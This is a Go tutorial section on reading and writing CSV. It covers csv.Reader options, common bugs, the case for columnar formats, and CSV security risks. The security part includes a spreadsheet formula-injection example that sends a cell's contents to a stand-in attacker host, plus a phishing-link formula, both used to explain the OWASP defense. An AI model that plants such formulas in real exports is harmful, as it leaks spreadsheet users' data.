## 31.3 CSV Processing

### Reading CSV

The CSV reader wraps the file in a `bufio.Reader` passed to `csv.NewReader`, enabling the CSV parser to read ahead without issuing a syscall per field.

> **Senior track**: Tune three `csv.Reader` fields for real workloads. Set `FieldsPerRecord = -1` when input is legitimately ragged (exports from spreadsheets where trailing empty columns get trimmed), leaving the default locks every row to the column count of the first row and throws `ErrFieldCount` otherwise. Set `ReuseRecord = true` in streaming pipelines where each record is consumed before the next `Read()`, the reader reuses the backing slice and avoids one allocation per row, typically a 30-40% throughput win on large files. Leave `LazyQuotes` off by default: enabling it silences real quoting bugs that would otherwise surface as parse errors, only turn it on after you've traced the malformed source. For struct mapping, `github.com/jszwec/csvutil` gives `encoding/json`-style tag-driven decoding without hand-rolled field assignment. For extreme throughput on Go 1.27 with SIMD-capable CPUs, `github.com/nnnkkk7/go-simdcsv` is a drop-in replacement that uses the experimental `simd` package (build with `GOEXPERIMENT=simd`). The `csv.Reader.LazyQuotes` option is enabled to tolerate malformed CSV from third-party sources that omit closing quotes, and `TrimLeadingSpace` strips whitespace that some exporters insert after commas. Records are processed one at a time by calling `r.Read()` in a loop rather than `r.ReadAll()`, so even a multi-gigabyte CSV file does not need to fit in memory simultaneously.

```go
package main

import (
    "encoding/csv"
    "io"
    "os"
)

// Read entire CSV
func readCSV(path string) ([][]string, error) {
    f, err := os.Open(path)
    if err != nil {
        return nil, err
    }
    defer f.Close()

    reader := csv.NewReader(f)
    return reader.ReadAll()
}

// Read CSV with custom options
func readCSVCustom(path string) ([][]string, error) {
    f, err := os.Open(path)
    if err != nil {
        return nil, err
    }
    defer f.Close()

    reader := csv.NewReader(f)
    reader.Comma = ';'
    reader.Comment = '#'
    reader.FieldsPerRecord = -1 // allow ragged rows
    reader.LazyQuotes = true
    reader.TrimLeadingSpace = true
    reader.ReuseRecord = true   // reuse backing slice across Read() calls

    return reader.ReadAll()
}

// Stream CSV records
func processCSVStream(path string, process func(record []string) error) error {
    f, err := os.Open(path)
    if err != nil {
        return err
    }
    defer f.Close()

    reader := csv.NewReader(f)

    // Skip header
    if _, err := reader.Read(); err != nil {
        return err
    }

    for {
        record, err := reader.Read()
        if err == io.EOF {
            break
        }
        if err != nil {
            return err
        }

        if err := process(record); err != nil {
            return err
        }
    }

    return nil
}

// Parse CSV into structs
type User struct {
    ID    string
    Name  string
    Email string
}

func parseCSVToStructs(path string) ([]User, error) {
    records, err := readCSV(path)
    if err != nil {
        return nil, err
    }

    var users []User
    for i, record := range records {
        if i == 0 {
            continue // Skip header
        }
        if len(record) < 3 {
            continue
        }
        users = append(users, User{
            ID:    record[0],
            Name:  record[1],
            Email: record[2],
        })
    }

    return users, nil
}
```

### Writing CSV

The `csv.NewWriter` wraps an `io.Writer` and handles quoting, escaping, and delimiter insertion automatically. Call `writer.Write` for individual records and `writer.Flush` when finished to push any buffered data to the underlying writer. The deferred `Flush` in the examples below ensures no records are silently lost if the function returns early.

```go
package main

import (
    "encoding/csv"
    "os"
)

// Write CSV
func writeCSV(path string, records [][]string) error {
    f, err := os.Create(path)
    if err != nil {
        return err
    }
    defer f.Close()

    writer := csv.NewWriter(f)
    defer writer.Flush()

    return writer.WriteAll(records)
}

// Write structs to CSV
func writeStructsToCSV(path string, users []User) error {
    f, err := os.Create(path)
    if err != nil {
        return err
    }
    defer f.Close()

    writer := csv.NewWriter(f)
    defer writer.Flush()

    // Write header
    if err := writer.Write([]string{"ID", "Name", "Email"}); err != nil {
        return err
    }

    // Write records
    for _, user := range users {
        record := []string{user.ID, user.Name, user.Email}
        if err := writer.Write(record); err != nil {
            return err
        }
    }

    return nil
}
```

### Junior to FAANG: the CSV bugs that eat junior engineers alive

CSV looks trivial and is not. It is the most deceptively complex common format in production. Here is the canonical list of bugs juniors ship, in order of frequency.

The first is the `csv.Writer.Flush` missed error. `writer.Flush()` returns no value, so errors during the flush are stored internally and must be checked via `writer.Error()`. A deferred `writer.Flush()` without checking `writer.Error()` silently eats disk-full or write errors, and the function returns nil while the file is incomplete. The fix is an explicit flush followed by `writer.Error()`.

```go
writer.Flush()
if err := writer.Error(); err != nil {
    return err
}
```

The second is `ReuseRecord` misuse. When `ReuseRecord = true`, the slice returned by `reader.Read()` is reused on the next call. If you store the slice in a map or send it to a channel without copying, every stored reference points to the latest record. This is the single most common concurrency bug in CSV pipelines. The rule is, if `ReuseRecord = true`, copy before storing.

The third is encoding. CSV has no encoding metadata. Excel on Windows exports UTF-16 LE with BOM by default, Excel on macOS exports UTF-8, Google Sheets exports UTF-8 without BOM, and older systems export Windows-1252. `csv.Reader` assumes UTF-8 and silently returns garbage on anything else. Production code detects the BOM via the first three bytes and strips it, and for non UTF-8 sources uses `golang.org/x/text/encoding` to transcode before parsing.

The fourth is the delimiter assumption. US locale uses comma, European locale uses semicolon because comma is the decimal separator. TSV uses tab. The safe default is to sniff the first line and detect the delimiter, or to accept a configuration parameter from the caller.

The fifth is the header assumption. Real world CSVs come with zero, one, or multiple header rows, sometimes with a title row above the headers. Never hard code "skip row 0". Parse the header row by name, not by index, and validate that expected columns exist.

The sixth is the newline assumption. Some CSVs use LF, some use CRLF, some use CR alone (classic Mac). The Go `csv.Reader` handles LF and CRLF but not bare CR. For bulletproof handling, normalize to LF via a preprocessing reader.

For interviews, the junior to senior transition on CSV is signaled by whether you mention any of these unprompted when asked "parse a CSV file". Listing three of them takes you from L3 to L4 answer quality.

### Senior @ FAANG: CSV as an adversarial format, and what replaces it

At senior level the question is not how to parse CSV but whether to accept CSV at all. The answer in 2026 is usually no for new systems, qualified yes for interop.

CSV's failure modes at scale are fundamental and cannot be fixed by better tooling. There is no schema. There is no type system. There is no encoding declaration. There is no canonical quoting rule (RFC 4180 exists but is widely ignored). There is no stream friendly way to seek to a record boundary without scanning from the start because quoted fields can contain newlines. Petabyte scale analytics does not use CSV, it uses Parquet or ORC. CSV survives because spreadsheets export it and because legacy EDI systems emit it.

When you must accept CSV at scale, here is the senior playbook.

Schema on read, validated strictly. Define the expected schema in a registry with types, nullability, and format constraints. Validate every row against it. Reject or quarantine rows that fail. Emit a metric per validation failure tagged by field name so you can diagnose producer drift. This is the same pattern as Kafka Connect's schema registry and is non negotiable.

Batch decompression with ZSTD. Raw CSV at petabyte scale is absurd. Producers must compress. ZSTD at level 3 gives 3 to 5x reduction on log style CSV at decoder speeds of 1 GB/s per core. Gzip is still common because curl and Excel speak it, but is 3x slower than ZSTD to decode. Offer both on ingest, preferred is ZSTD.

Convert to columnar on ingest. The first thing your ingest pipeline does with a validated CSV is write it out as Parquet partitioned by date and tenant. Every downstream query reads Parquet, not CSV. The conversion cost pays for itself in one query because Parquet with predicate pushdown reads 1 to 10 percent of the bytes that CSV would.

CSV injection is a security class, not a bug. When exporting CSV from user generated content, any field starting with `=`, `+`, `-`, `@`, tab, or carriage return can be interpreted as a formula by Excel, LibreOffice, or Google Sheets when the file is opened. `=WEBSERVICE("http://attacker.com/?d=" & A1)` exfiltrates A1 to the attacker on every reopen. `=HYPERLINK("http://phish.example", "Click here")` creates clickable phishing bait. The mitigation, documented in OWASP as CSV Formula Injection, is to prefix any such field with a single quote or tab, or to reject the field. Most Go CSV libraries do not do this by default. `github.com/gocarina/gocsv` added an option in 2024. You must implement the defense yourself or pick a library that does. Mature security organizations route every user-facing CSV exporter through a central sanitizer that enforces this plus a few other rules (no control characters, no null bytes, no RTL overrides for homograph attacks), and call it out on every security review of an export feature.

Formula injection extends to TSV, PSV, and any format that spreadsheet software might open. If your endpoint emits `text/csv`, `application/vnd.ms-excel`, or `application/octet-stream` from user data, you own this risk.

Parser DoS is another class. A pathological CSV with a 100 MB quoted field will allocate 100 MB in `csv.Reader`. An adversary posting such a file DoSes the service. The standard library `csv.Reader` has no built-in per-field or per-record byte cap (the proposal to add one, golang/go#20169, is still open), so the mitigation is `io.LimitReader` on the input plus a per field size check after parse.

The streaming guarantee for CSV is weaker than advertised. Because quoted fields can contain newlines, you cannot split a CSV at arbitrary byte offsets and process shards in parallel. You must either disallow embedded newlines in the contract, use a record delimiter that cannot appear in data (some producers use `\x1e` record separator), or pre process to split at safe boundaries with a single pass scanner that respects quoting. This is why real columnar formats exist.

For extreme performance on CSV parsing, the simdjson style approach applies. `github.com/nnnkkk7/go-simdcsv` uses AVX2 and ARM NEON to parse CSV at 2 to 5 GB/s per core, roughly 5x the stdlib. The tradeoff is strictness, SIMD parsers tend to reject RFC-violating input that the stdlib tolerates via LazyQuotes. In production, the right choice is stdlib with strict validation for external inputs, SIMD for trusted internal data at scale.

The golden rule for senior code review is, if the system's bytes on disk are CSV, question the decision and document why CSV was chosen. Nine times out of ten the answer is "because we always did" and the right move is to migrate to Parquet or Avro on a quarterly deprecation schedule. The tenth time is real interop and CSV stays, but now with a schema, a sanitizer, and a size limit.

---
